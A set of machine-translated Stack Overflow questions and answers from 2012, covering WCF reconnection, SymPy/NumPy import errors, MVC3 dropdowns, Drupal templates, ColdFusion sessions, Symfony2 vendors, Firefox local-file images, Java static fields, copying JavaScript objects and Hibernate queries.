> 时间：2012-04-22T18:11:09.567
> 
> 标签：wcf, c#-4.0, client-server

我有一个服务器，它从多个系统接收数据，将它们添加到数据库并使用最新接收的数据更新另一个应用程序（客户端）。这个客户端（都在同一台计算机上运行）以有组织的形式呈现数据并对其进行一些处理。此外，它可以使用服务器在数据库中执行查询。所以它使用来自服务器的函数来获取历史数据。

对于此通信，我使用 WCF，并且服务器在 .config 中声明如下：

```
 <system.serviceModel>
    <behaviors>
      <serviceBehaviors>
        <behavior name="">
          <serviceMetadata/>
          <serviceDebug includeExceptionDetailInFaults="false"/>
        </behavior>
      </serviceBehaviors>
    </behaviors>
    <services>
      <service name="ServiceName">
        <endpoint binding="netTcpBinding" contract="IServiceName">
          <identity>
            <dns value="localhost"/>
          </identity>
        </endpoint>
        <endpoint address="mex" binding="mexTcpBinding" contract="IMetadataExchange"/>
        <host>
          <baseAddresses>
            <add baseAddress="net.tcp://localhost:5050/msservice"/>
          </baseAddresses>
        </host>
      </service>
    </services>
  </system.serviceModel> 
```

客户端使用以下配置：

```
<system.serviceModel>
    <bindings>
        <netTcpBinding>
            <binding name="NetTcpBinding_IService" closeTimeout="00:02:00" openTimeout="00:02:00" receiveTimeout="00:10:00" sendTimeout="00:02:00" transactionFlow="false" transferMode="Buffered" transactionProtocol="OleTransactions" hostNameComparisonMode="StrongWildcard" listenBacklog="10" maxConnections="10" maxBufferSize="2147483647" maxBufferPoolSize="2147483647">
                <reliableSession ordered="true" inactivityTimeout="00:10:00" enabled="false"/>
                <security mode="Transport">
                    <transport clientCredentialType="Windows" protectionLevel="EncryptAndSign"/>
                    <message clientCredentialType="Windows"/>
                </security>
            </binding>
        </netTcpBinding>
    </bindings>
    <client>
        <endpoint address="net.tcp://localhost:5050/msservice" binding="netTcpBinding" bindingConfiguration="NetTcpBinding_IService" contract="Server.IService" name="NetTcpBinding_IService">
            <identity>
                <dns value="localhost"/>
            </identity>
        </endpoint>
    </client>
</system.serviceModel> 
```

当客户端创建服务（连接到服务器）时，它使用称为订阅的服务功能，该功能将客户端包括在服务器连接的客户端列表中。当新数据到达时，它会在所有客户端中引发一个事件。

但是，在客户端不活动之后（因为它不会定期向服务器发送消息，即使相反的情况发生的频率很高），它也会进入故障状态。发生这种情况时，服务器函数的每个客户端调用都会引发异常。

无论是在服务器端还是客户端，我都希望在通道关闭时自动重新连接，以保证客户端仍然接收来自客户端的消息，并且来自客户端的函数调用由服务器执行。

非常感谢你的帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-11-26T13:28:06.617

负载均衡器在 1 分钟后关闭空闲连接。因此，如果您想保持连接处于活动状态，那么应该始终进行一些通信

1) 第一个选项是每分钟调用一次操作。

2）如果这是不可能的，那么

*   在绑定上启用可靠消息传递，WCF 基础结构将处理它。
*   您可以配置 inactivityTimeout 和 receiveTimeout 以确保通道保持打开状态。
*   两个超时都必须设置，否则如果任何一个超时，通道就会出现故障。
*   可靠会话配置后，如果连接变为空闲状态，WCF 将生成流量以使其保持打开状态。

# numpy - sympy 和 numpy 还是 IPython 兼容性？

> ID：10270681
> 
> 赞同：2
> 
> 时间：2012-04-22T18:11:59.083
> 
> 标签：numpy, python-2.7, sympy

我发现如果我同时安装了 sympy 和 numpy（编辑：或 IPython）（32 位 Windows 7），那么我只能通过其 isympy 脚本文件运行 sympy，例如，从 git-bash 控制台

```
pushd /c/Python27/Lib/site-packages/sympy/bin
python isympy
limit(diff(exp(-1/t**2), t, 64), t, 0) 
```

紧缩几秒钟然后打印 0

但是，如果我尝试导入 sympy，如

```
from sympy import Symbol, cos 
```

我得到一个`ImportError: cannot import name Float`（下面的完整追溯）

我仍然可以从其`isympy`脚本运行 sympy，并且可以将 numpy 和 scipy 导入从`isympy`脚本启动的会话中。在这种情况下，numpy 和 scipy 打印输出与记录的结果不同，但它们通过了一个小的临时测试。

这是一个已知问题，还是我搞砸或误解的问题？我将不胜感激建议，指导，类似的经验等。

顺便说一句，我没有使用 64 位版本，因为我也在尝试安装 matplotlib，并且我认为 Tkinsert 不是有效的可执行文件出了点​​问题，所以我一直支持一切的 32 位版本。

编辑：

从头开始，安装 sympy 而不是 numpy，测试它 100% ok，然后安装 IPython。现在`from sympy import Symbol`产生一个类似的堆栈跟踪。

结束编辑

详情如下：

在 Windows 7 上将 Python 2.7.3 32 位全新安装到默认目录`C:\Python27`中。然后使用 git-bash 窗口安装 sympy，如下所示

```
pushd /c/Python27/Lib/site-packages
git clone git://github.com/sympy/sympy.git
cd sympy
python setup.py install 
```

测试：

```
python setup.py test 
```

跑了一会儿，都过去了。

标准的临时测试

```
from sympy import cos
x = Symbol('x')
(1/cos(x)).series(x,0,10) 
```

印刷

```
1 + x**2/2 + 5*x**4/24 + 61*x**6/720 + 277*x**8/8064 + O(x**10) 
```

通过脚本运行 sympy 可以`isympy`提供更漂亮的打印效果

```
quit()
python /c/Python27/Lib/site-packages/sympy/bin/isympy

>>> (1/cos(x)).series(x, 0, 10)
     2      4       6        8
    x    5*x    61*x    277*x     / 10\
1 + -- + ---- + ----- + ------ + O\x  /
    2     24     720     8064 
```

现在，通过浏览器安装 numpy：

[http://sourceforge.net/projects/numpy/files/NumPy/1.6.1/numpy-1.6.1-win32-superpack-python2.7.exe/download](http://sourceforge.net/projects/numpy/files/NumPy/1.6.1/numpy-1.6.1-win32-superpack-python2.7.exe/download)

新会话中的临时测试

```
python
import numpy as np
a = np.arange(10)
a 
```

印刷

```
array([0, 1, 2, 3, 4, 5, 6, 7, 8, 9]) 
```

但

```
from sympy import Symbol,cos 
```

生成

```
Python 2.7.3 (default, Apr 10 2012, 23:31:26) [MSC v.1500 32 bit (Intel)] on win32
Type "help", "copyright", "credits" or "license" for more information.
>>> from sympy import Symbol,cos
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "sympy\__init__.py", line 49, in <module>
    from sympy.core import *
  File "sympy\sympy\__init__.py", line 52, in <module>
    from polys import *
  File "sympy\sympy\polys\__init__.py", line 3, in <module>
    from polytools import (
  File "sympy\sympy\polys\polytools.py", line 17, in <module>
    from sympy.polys.polyclasses import DMP
  File "sympy\polys\__init__.py", line 3, in <module>
    from polytools import (
  File "sympy\polys\polytools.py", line 64, in <module>
    from sympy.polys.domains import FF, QQ
  File "sympy\polys\domains\__init__.py", line 11, in <module>
    from finitefield import FiniteField
  File "sympy\polys\domains\finitefield.py", line 5, in <module>
    from sympy.polys.domains.groundtypes import SymPyIntegerType
  File "sympy\polys\domains\groundtypes.py", line 34, in <module>
    from sympy import (
                       ImportError: cannot import name Float 
```

我还能跑

```
python /c/Python27/Lib/site-packages/sympy/bin/isympy 
```

但现在

```
import numpy as np
a = np.arange(10)
a 
```

印刷

```
[0, 1, 2, 3, 4, 5, 6, 7, 8, 9] 
```

而不是预期的

```
array([0, 1, 2, 3, 4, 5, 6, 7, 8, 9]) 
```

# visual-studio-2010 - MVC3 DropDownList 代码优先

> ID：10270686
> 
> 赞同：0
> 
> 时间：2012-04-22T18:12:21.647
> 
> 标签：visual-studio-2010, asp.net-mvc-3, model, drop-down-menu, ef-code-first

我有以下 MVC3 模型：

```
public class Dine
{
    [Key]
    [Display(Name = "Table Number")]
    public string TableNumber { get; set; }

    public List<SelectListItem> TableSelections { get; set; }

    [Display(Name = "Table Date")]
    [Required(ErrorMessage = "Please enter a date")]
    public DateTime Date { get; set; }

} 
```

}

列表项值在控制器中定义，下拉列表在视图中显示良好，仅当按下提交以将值保存到数据库时，我收到以下错误：

有谁知道如何解决这个问题？

它基于本教程[http://codeoverload.wordpress.com/2011/05/22/dropdown-lists-in-mvc-3/](http://codeoverload.wordpress.com/2011/05/22/dropdown-lists-in-mvc-3/)

谢谢

编辑我遵循了下面的建议并收到此错误：无法将类型'System.Collections.Generic.List'转换为'System.Web.Mvc.SelectList'

这是我的看法：

```
<td>@Html.DropDownListFor(model => model.TableSelection, (SelectList)ViewBag.Tables)</td> 
```

这就是我的模型中的内容

```
public class Dine
{
    [Key]
    [Display(Name = "Table No")]
    public int TableNo { get; set; }

    public string TableOption { get; set; }

    [Display(Name = "Table Date")]
    [Required(ErrorMessage = "Please enter a date")]
    public DateTime Date { get; set; }
}
} 
```

这是我的控制器：

```
public class RestaurantController : Controller
{
    TheDatabaseEntities db = new TheDatabaseEntities();
    //
    // GET: /Dine/

    public ActionResult Index()
    {   
        ViewBag.Tables = GetTableOptions();
        return View();
    }

    [HttpPost]
    public ActionResult Index(Restaurant model)
    {
        if (ModelState.IsValid)
        {

            return RedirectToAction("AddBookingComplete");
        }
        ViewBag.Tables = GetTableOptions();

        return View(model);
    }
    public ActionResult BookingComplete()
    {
        return View();
    }

    private List<Restaurant> GetTableOptions()
    {
        List<Restaurant> Tables = new List<Restaurant>();
        Table.Add(new Dine() { TableNumber = 1, TableSelection = "Table 1" });
        Table.Add(new Dine() { TableNumber = 2, TableOSelection = "Table" });
        Table.Add(new Dine() { TableNumber = 3, TableSelection = "Table" });
        Tables.Add(new Dine() { TableNumber = 4, TableSelection = "Table" });

        return Table;
        }
}
} 
```

任何帮助都会得到帮助，因为我对 MVC3 很陌生，谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-22T22:52:58.613

神秘人是对的。我猜您需要将下拉列表中的选定值保存到数据库中。如果是这样，请通过以下方式更改 TableOption 属性：

```
public string TableOption { get; set; } 
```

然后，在您的控制器中，使用 ViewBag 将 SelectList 对象传递给您的视图，正如 Mystery 所说：

```
ViewBag.Tables = yourList; 
```

并在您的视图中使用下拉帮助程序来填充选择并绑定到模型：

```
@Html.DropDownListFor(model => model.TableOption, new SelectList(ViewBag.Tables, "TableNo","TableOption")) 
```

最后将您的模型保存在您的后期操作方法中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-22T18:31:32.207

不，您没有 MVC3 模型。您有一个试图用作 MVC3 模型的实体框架模型。这不是一个微妙的区别。

您正在向 Entity Framework 模型添加一个选择列表，因此 Entity Framework 正在尝试将其序列化到数据库中。不要那样做。对数据使用实体模型，对 MVC 使用视图模型。

你声称你正在做的事情是基于一个教程，但在那个教程中你没有看到他们使用实体框架模型。这是一个视图模型。

如果您坚持在您的视图中使用您的 EF 模型（尽管最佳实践说不要这样做），那么您需要通过 ViewData（或 ViewBag）而不是在您的模型中传递您的 SelectList。

# php - Drupal 7：如何完全控制节点的布局

> ID：10270688
> 
> 赞同：0
> 
> 时间：2012-04-22T18:12:57.050
> 
> 标签：php, drupal, drupal-7, drupal-modules, drupal-theming

我正在尝试为 Drupal 7 站点的主页进行 3 列布局。

我在模板中创建了一个区域。

然后我有一个名为 text_panel 的内容类型，它使用节点块模块。对于每一列，我只创建一个新的 text_panel 节点，并将其像块一样添加到主页上的区域。

然后我创建了一个名为 node--text_panel.tpl.php 的文件，其中包含以下标记：

```
 <div class="span4">
        <h3><?php print $title; ?></h3>            
        <p><?php print $body[0]['value'] ?></p>
    </div> 
```

这显示得很好，除了标题显示两次的事实。Drupal 在 h2 标记中输出一次，然后根据我的节点级模板文件再次输出。如何停止 Drupal 输出 h2？我希望节点完全按照我在模板文件中定义的方式显示。

有一个模块可以摆脱标题，但它通过在显示之前清除变量来做到这一点，这对我没有好处。我希望它显示出来，但正如我所说的那样。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-23T07:53:55.923

Have a look at [display suite](http://drupal.org/project/ds) module.

# coldfusion - ColdFusion 忘记了 1 行内的变量

> ID：10270689
> 
> 赞同：1
> 
> 时间：2012-04-22T18:13:04.953
> 
> 标签：coldfusion, coldfusion-8

我的公司与 ColdFusion 合作，并且多年来在不同的变体中遇到了这个问题。是时候解决它了。

场景非常简单：

```
<cfparam name="session.check" default="0">
<cfif NOT isDefined('session.check') OR 
      session.check IS 0>
    <cfset ok=1>
</cfif> 
```

现在 ColdFusion 抛出一个错误：

> SESSION 中未定义元素 CHECK。错误发生在第 18 行。

对于那些可以从中读取内容的人，这里是详细的堆栈跟踪：

> Coldfusion.runtime.UndefinedElementException：元素检查在会话中未定义。在coldfusion.runtime.CfJspPage.resolveCanonicalName(CfJspPage.java:1694) 在coldfusion.runtime.CfJspPage._resolve(CfJspPage.java:1612) 在coldfusion.runtime.CfJspPage._resolveAndAutoscalarize(CfJspPage.java:1747) 在coldfusion.runtime。 CfJspPage._resolveAndAutoscalarize(CfJspPage.java:1740) 在 cfindex2ecfm123677868._factor9(C:\path\index.cfm:18) 在 ...

如果使用 cfparam 或者只是一个 cfset 并不重要。此外，这不是一个简化的示例，这个错误发生在我们的服务器上。在设置和读取的变量之间没有单行。

我们正在运行 ColdFusion 8.0.1.195765。有任何想法吗？

提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-22T19:33:49.180

尝试使用`structKeyExists`而不是`isDefined`

```
<cfif NOT structKeyExists(session, 'check') OR 
      session.check IS 0>
    <cfset ok=1>
</cfif> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-23T14:45:36.187

这里有 2 个猜测.... 首先，您可能会被错误的行号所迷惑。查看第 18 行上方 - 在您粘贴到堆栈或执行顺序中的代码上方。寻找另一个“检查”参考。

同时，这段代码：

```
<cfparam name="session.check" default="0">
<cfif NOT isDefined('session.check') OR 
      session.check IS 0>
    <cfset ok=1>
</cfif> 
```

虽然 ok... 包括 "NOT isDefined('session.check')" ... 考虑到它前面的 cfparam 是多余的。Cfparam 应*保证*var 存在，因此您不需要“isDefined”。我猜它是因为错误而被放入的。

猜数字 2

根据应用程序，这也可能是某种竞争问题——尤其是在使用帧或 ajax 时。尝试在会话范围内使用 CFLOCK 将代码括起来：

```
<cflock scope="session" timeout="4">
   <cfparam name="session.check" default="0">
   <cfif NOT isDefined('session.check') OR 
         session.check IS 0>
       <cfset ok=1>
   </cfif>
</cflock> 
```

这将确保*此*代码将在未更改的会话上运行 - 不保证可能会命中该会话的其他代码。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-22T18:46:47.123

您是否需要声明会话超时？这一次在 12 小时内超时...

```
 <!--- Create the application --->
 <cfapplication name="MyApp" clientmanagement="Yes"
                sessionmanagement="Yes"
                sessiontimeout="#CreateTimeSpan(0,12,0,0)#"
                applicationtimeout="#CreateTimeSpan(0,12,0,0)#">
        <!--- 
        #CreateTimeSpan(days,hours,minutes,seconds)#
        --->

 <cfparam name="session.check" default="0"> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-23T18:02:00.977

检查并确保您的 CFApplication 名称是唯一且独特的。最佳实践通常最终会散列当前目录以确保这一点，但您也可以尝试添加版本号以绝对确定。例如：

```
<CFAPPLICATION name="myApp_0001_#hash(getCurrentTemplatePath())#"> 
```

不断重启的问题服务器也可能会丢失会话，但前面的原因可能是最常见的原因……尤其是在共享托管环境中。

# date - openoffice：纪元和日期 X 之间的星期五数？

> ID：10270693
> 
> 赞同：1
> 
> 时间：2012-04-22T18:13:37.810
> 
> 标签：date, openoffice.org

我正在处理 OpenOffice 中的家庭预算，我想计算一个纪元以来的星期五数（以便计算支付期数）。

有没有可以做到这一点的功能？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-22T18:20:50.660

哦，我们开始；我只需要做

```
=FLOOR((X-X0)/7;1) 
```

其中 X 是对所需日期单元格的引用，而 X0 是一个常量日期等效项，它位于星期五，因为 OpenOffice 似乎将日期转换为缩放因子为 1.0 = 1 天的浮点数。

# php - symfony2，如何仅安装添加到 deps 文件的新捆绑包？

> ID：10270694
> 
> 赞同：1
> 
> 时间：2012-04-22T18:13:46.980
> 
> 标签：php, symfony, bundle

在 symfony2 项目`php bin/vendors install`中，重新安装`deps`文件中的所有包。每次我将一个捆绑包添加到`deps`文件中时，我都必须等待很长时间。

有没有其他方法可以只安装/更新新添加的而不重新安装所有内容？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-22T18:20:42.110

`vendors`不，脚本不支持此功能。[由于在Composer](http://getcomposer.org/)发布之前它只是一个存根，所以没有人会费心把它变成一个超级优化的脚本。

顺便说一句，它实际上并没有在每次运行时*重新安装*所有捆绑包，而只是在第一次运行时克隆新的 repos，然后在连续运行时拉取它们。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-25T09:49:05.247

```
php bin/vendors update 
```

是正确的。您可以在 debs 文件上设置版本。

```
[twig]
    git=http://github.com/fabpot/Twig.git
    version=v1.8.2 
```

该版本与“Git 标签”相关，您可以转到供应商文件夹并检查女巫版本或 git 标签是否可用：

```
git tag 
```

然后你将你的包设置为指定的版本，他只将包更新到这个版本而不安装更新的版本。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-25T12:05:36.220

使用“#”注释不需要的包

例如 ：

```
#[symfony]
#    git=http://github.com/symfony/symfony.git
#    version=v2.0.21
#
#[twig]
#    git=http://github.com/fabpot/Twig.git
#    version=v1.10.3
#
#[monolog]
#    git=http://github.com/Seldaek/monolog.git
#    version=1.2.1 
```

并执行

php bin/供应商安装

或者

php bin/vendors install --reinstall

# javascript - 如何在 Firefox 11 中查看来自 http://localhost 服务页面的文件：//图像？

> ID：10270701
> 
> 赞同：4
> 
> 时间：2012-04-22T18:14:29.190
> 
> 标签：javascript, html, file, firefox, local

我的 localhost 机器（端口 8080）上运行了一个服务器，它试图为本地文件创建 IMG 标记。但是，这些文件不会出现在 Firefox 11 中。

我最初是使用 Javascript 创建图像标签，但由于失败，我回到 HTML 来尝试各种直接引用文件的方法。以下都不起作用：

```
<img src="file:///localhost:8080/C://Users/me/IMG_1000.JPG">
<img src="file:///localhost/C://Users/me//IMG_1000.JPG">
<img src="file:///C://Users/me/IMG_1000.JPG"> 
```

如果我将最后一个 URL 直接粘贴到地址栏中，则图像可以正常打开。

我已按照此处的说明进行操作：

[http://kb.mozillazine.org/Firefox_:_Issues_:_Links_to_Local_Pages_Don%27t_Work](http://kb.mozillazine.org/Firefox_:_Issues_:_Links_to_Local_Pages_Don%27t_Work)

我已经尝试直接修改 user.js 和 prefs.js，也可以通过 about:config 查看器进行修改。

我从帮助 -> 故障排除信息 -> 配置文件目录 -> 打开包含文件夹中获得了配置文件目录的正确路径。

添加的相关行是：

```
user_pref("capability.policy.localfilelinks.checkloaduri.enabled", "allAccess");
user_pref("capability.policy.localfilelinks.sites", "localhost:8080");
user_pref("capability.policy.policynames", "localfilelinks"); 
```

我最初将 http:// 放入“localhost:8080”中，但 Firefox 删除了它。我也尝试了“http://localhost”和“http://127.0.0.1”，但它们也不起作用。

但是......奇怪的是，即使我从 about:config 输入它们并且可以在 prefs.js 中看到它们，我也无法从 about:config 看到它们！这让我觉得 mozillaazine 上的信息可能已经过时了，毕竟它说该信息适用于“Firefox 1.5 及更高版本”并且我使用的是 Firefox 11！

注意：我想使用 file:// 访问的原因是我不想允许任意访问我机器上的文件。再解释一下：我有一个数据库接口，访问数据库所需的只是密码。这很好，因为我想允许任何有密码的人在我的机器之外访问数据库，但是图像文件存在于数据库之外。为了通过服务器提供文件（因为存在的文件是动态的），我需要创建一个新的 CGI，它在数据库中采用某种标识符，但由于用户可以访问数据库，他们可以注入任何文件名他们想。

编辑：另外，我也不能 window.open() 文件 URL。那有什么可能的安全好处？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-24T04:06:02.813

```
<img src="file:///localhost:8080/C://Users/me/IMG_1000.JPG">
<img src="file:///localhost/C://Users/me//IMG_1000.JPG"> 
```

如果它是 8080 上的服务器，则不应使用 file://——它不是文件。它应该是[http://localhost:8080/blah](http://localhost:8080/blah)。我不认为它是这样工作的，但第二个（如果它应该工作的话）将是 file://localhost/c:/* - 注意斜杠的数量。上面的行有一个额外的 // 它应该在 /

```
<img src="file:///C://Users/me/IMG_1000.JPG"> 
```

现在这是有道理的，但由于安全限制，您访问它的能力将受到限制。

```
user_pref("capability.policy.localfilelinks.sites", "localhost:8080"); 
```

[如果页面是从http://localhost:8080/](http://localhost:8080/) *加载的，那（可能）应该适用于 file:///c:/* 的东西。

*   使用[http://localhost:8080/](http://localhost:8080/) * - 可能是最好的解决方案
*   使用文件夹并将其全部软链接或硬链接到实际文件，以最大程度地减少磁盘使用和更新问题。
*   使用文件夹并使用无数工具（rsync 等）中的任何一种进行同步

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2012-04-22T18:18:39.303

1.  在您的网站内创建一个新文件夹
    2 复制新文件夹中的所有数据
    3.然后提供指向该文件夹的链接。

# java - Java，一个类的多个实例使用最新创建的实例重置

> ID：10270706
> 
> 赞同：0
> 
> 时间：2012-04-22T18:15:10.407
> 
> 标签：java, android, list, linked-list

我得到了一个带有我创建的类的链接列表，但是每次我向列表中添加一个新实例时，列表中的所有其他元素都会获得相同的数据。

这是我列表中的课程。

```
public class ZitEntity 
{
private int mSize;
public boolean poped;
private boolean done;
private Canvas can;
private int count;
private  static Vector2D mPosition;
private int ms;
private Bitmap Zit;

public ZitEntity(int a, int b)
{
    mSize = 20;
    poped = false;
    done = true;
    ms = 3;
    mPosition = new Vector2D(a,b);
    Zit = Bitmap.createBitmap(mSize*2, mSize*2, Bitmap.Config.ARGB_8888);
} 
```

在第二节课中，我创建了一个列表。

```
private LinkedList<ZitEntity> entityList; 
```

并在构造函数中启动列表。

```
entityList = new LinkedList<ZitEntity>(); 
```

这里是我在列表中添加一个新实例的地方：

```
private void createEntity()
{
    Random generator = new Random();
    int a = generator.nextInt(10);
    if(a==5)
    {   
        int x = generator.nextInt(ZitGame.height-60)+20;
        int y = generator.nextInt(ZitGame.width-120)+20;
        entityList.add(new ZitEntity(x,y));
        Log.v("add entity", "new entity");
    }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-22T18:17:05.070

您将 mPosition 声明为静态，因此每次您都会获得每个项目的最新位置

# asp.net-mvc-3 - 具有良好功能的 mvc3 网格

> ID：10270707
> 
> 赞同：-1
> 
> 时间：2012-04-22T18:15:10.430
> 
> 标签：asp.net-mvc-3, grid

我正在寻找一个 asp.net + c# + mvc3 网格，我可以在其中执行以下操作

1.  显示项目
2.  链接到项目以在新页面中显示其描述
3.  排序
4.  寻呼
5.  为网格中的每个项目添加复选框，并在网格后添加一个按钮以更新所选项目
6.  能够在网格中添加下拉列表并根据选择进行操作

有人可以建议一个好的教程或插件或一些对我有帮助的东西吗？提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-24T03:07:02.300

查看 Telerik MVC 控件。您应该能够使用他们的网格来完成所有这些（6 可能很棘手，但它可能能够使用模板列来完成）。

[http://www.telerik.com/products/aspnet-mvc.aspx](http://www.telerik.com/products/aspnet-mvc.aspx)

# linux - Linux 上的 Flex Builder

> ID：10270710
> 
> 赞同：2
> 
> 时间：2012-04-22T18:15:20.920
> 
> 标签：linux, flexbuilder

有没有办法在 Linux 上使用 Flex Builder？

Adobe 已正式放弃 Linux 对 Flash Builder IDE 的支持。Google Code 上有一个开源项目。所以我试了一下，但没有设计器模式和其他一些编译问题。

我只需要在 Linux 上开发我的项目前端，因为它的后端带有一些基于 Linux 的库。这就是为什么我无法进入 Windows。

如果还有其他人在 Linux 上开发 Flex，请给我一些帮助。

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-28T12:37:45.667

您可以在 linux 中开发和编译 flex，但是，运行 flexbuilder 是个问题。Adobe 从未发布 linux 所需的 FB UI 插件（它们也因 mac os cocoa 而失败）。你有两个选择：

1.  使用您想要的任何编辑器在终端中使用 flexc。您也可以编写一个 ant 脚本或使用 maven 来触发 flexc 从 eclipse 中自动编译您的项目。我知道有几个人以这种方式使用它并且它有效。

2.  我曾经设法让 fb 在 linux 上运行，除了设计器部分（对于 3.5 版）。我所做的实际上是将 flexbuilder 所需的所有插件复制到您的 eclipse 安装中。由于这不是受控插件安装，因此您必须小心捆绑版本，不要覆盖任何特定于操作系统的对应物。然而，即使你成功了，设计师也没有办法工作。

因此，无论哪种方式，您都不会拥有设计视图。

# javascript - 在 JavaScript 中复制关联数组

> ID：10270711
> 
> 赞同：8
> 
> 时间：2012-04-22T18:15:26.823
> 
> 标签：javascript, associative-array

我有以下代码用于将一个关联数组复制到另一个，

```
<script>

    var some_db = new Array();

    some_db["One"] = "1";

    some_db["Two"] = "2";

    some_db["Three"] = "3";

    var copy_db = new Array();

    alert(some_db["One"]);

    copy_db = some_db.slice();

    alert(copy_db["One"]);

</script> 
```

但是第二个警报说“未定义”..我在这里做错了吗？请任何指点...

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-04-22T18:23:54.463

在 JavaScript 中，关联数组称为对象。

```
<script>
    var some_db = {
       "One" : "1",
       "Two" : "2",
       "Three" : "3"
    };

    var copy_db = clone(some_db);

    alert(some_db["One"]);

    alert(copy_db["One"]);

    function clone(obj) {
        if (null == obj || "object" != typeof obj) return obj;
        var copy = obj.constructor();
        for (var attr in obj) {
            if (obj.hasOwnProperty(attr)) copy[attr] = clone(obj[attr]);
        }
        return copy;
    }
</script> 
```

`var copy_db = $.extend({}, some_db);`如果我使用 jQuery，我通常会使用。

**小提琴证明：http:** [//jsfiddle.net/RNF5T/](http://jsfiddle.net/RNF5T/)

[谢谢@maja](https://stackoverflow.com/questions/10270711/copy-associative-array-in-javascript#comment30343215_10270781)。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-22T18:21:23.290

正如@Niko 在评论中所说，JavaScript 中没有任何关联数组。

您实际上是在数组对象上设置属性，这不是一个好主意。你最好使用一个实际的对象。

```
var some_db = {};
some_db["One"] = "1";
some_db["Two"] = "2";
some_db["Three"] = "3";

var copy_db = {}, prop;
// Loop over all the keys in the object
for (prop in some_db) {
  // Make sure the object has this value, and not its prototype
  if (some_db.hasOwnProperty(prop)) {
    copy_db[prop] = some_db[prop];
  }
} 
```

许多库实现了一个`extend`功能，正是这样做的（将键从一个对象复制到另一个）。最值得注意的是[jQuery](http://api.jquery.com/jQuery.extend)和[Underscore.js](http://documentcloud.github.com/underscore/#extend)。Underscore.js 也[`_.clone(obj)`](http://documentcloud.github.com/underscore/#clone)有`_.extend( {}, obj )`

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2014-01-15T20:24:37.300

如果你想使用 JSON，你可以使用这个“关联数组”对象：

```
var assArray = {zero:0, one:1, two:2, three:3, what:'ever', you:'want'}; 
```

并像这样“克隆”它：

```
var clonedObj = JSON.parse(JSON.stringify(assArray)); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-19T19:13:21.680

[underscore.clone](http://underscorejs.org/#clone)可以提供帮助。它对字典对象或数组执行浅拷贝。

```
var some_db = {
  "One" : "1",
  "Two" : "2",
  "Three" : "3"
};

copy_db = _.clone(some_db); 
```

# sql - 使用休眠更快的选择语句

> ID：10270714
> 
> 赞同：2
> 
> 时间：2012-04-22T18:15:56.180
> 
> 标签：sql, hibernate, hql

在几篇文章中提到我们不应该获取表的所有列。我们应该避免`Select * from table1`和写`Select name, age, phone from table1`。

*Q1*）这是否意味着在编写 HQL 时，我们不应该编写`from Table1`？

*Q2* ) 我听说有些公司在他们的 java 代码中使用存储过程来获取数据，而不是编写 select 语句。这种技术真的有效吗？

*Q3* ) 我听说这是针对单个应用程序的。有时使用多个数据库而不是单个数据库。为什么呢？这种技术好不好？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-22T18:29:47.740

答案 1：Hibernate 不使用`select *`: 它转换`select from table`为`select col1, col2, col3 ... from table1`. 此外，如果您没有定义要休眠的列，它将不会选择它。

答案 2：我的建议是*避免*使用存储过程。它们实际上很少比查询快，尤其是对于简单的数据检索。有很多不使用它们的充分理由，包括 1) 不可移植，2) 无法调试，3) 无法进行单元测试，不胜枚举

答案 3：我会使用一个数据库，而不是拆分您的数据。管理起来太难了，而且您在系统中添加更多组件却无济于事（大多数系统也使用一个数据库，所以它不会那么糟糕）。*然而，分布式*数据库是一个好主意。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-22T18:21:54.497

使用 ORM 的想法是使用 Java 对象。所以使用`from Table`没问题，它让你准备好使用对象但是......

可能会发生您有大字段 Blob 或 Clob，然后将它们标记为延迟加载，因此您不必将它们保存在 Session 缓存中，这会消耗内存。

也可能发生需要选择 100 000 行的情况，那么使用 ORM 映射没有意义。您应该回退到 SQL 原生查询（Hibernate 也很好地管理它）。

对于小型结果集（您可以在 where 子句中对其进行限制），可以使用 HQL，除非您有大型 BLOB 和 CLOB。由于结果集很小，因此是否选择所需的字段并不那么重要（显然您可以这样做，但如果缺少某些数据，其他团队成员可能会出乎意料）。

对于大型数据集，HQL 没有意义。

# subdomain - 我需要站点的每个子域的站点地图吗？

> ID：10270715
> 
> 赞同：1
> 
> 时间：2012-04-22T18:16:05.587
> 
> 标签：subdomain, sitemap, google-crawlers

我有一个使用托管在子域上的不同较小站点构建的站点。子域和根域之间有很多链接，所以所有页面都可以合理到达。

每个站点都需要单独的站点地图吗？较小的站点之一是 WordPress 博客，生成站点地图很容易。但是，其他一些没有站点地图生成器。

我真的需要每个站点的站点地图，还是只要至少有一个链接到它们，我可以期望谷歌抓取所有页面吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-23T23:43:30.653

“如果有必要”是我将要讨论的问题。但是，您必须为每个子域/域创建一个 sitemap.xml 文件。（您不能在同一个 sitemap.xml 文件中包含来自多个域/子域的 URL）

# asp.net - 在 asp.net mvc3 中检测页面关闭（或卸载）

> ID：10270720
> 
> 赞同：5
> 
> 时间：2012-04-22T18:16:18.830
> 
> 标签：asp.net, asp.net-mvc-3, httprequest

我正在构建一个 MVC3 应用程序，当用户离开页面时，我需要在几个页面上执行一些操作。

例如，如果用户在页面 X 上并单击任何其他我需要执行操作 A、B、C 的链接

到目前为止，我的实现使用过滤器并检测用户是否从页面 X 导航到任何其他页面。

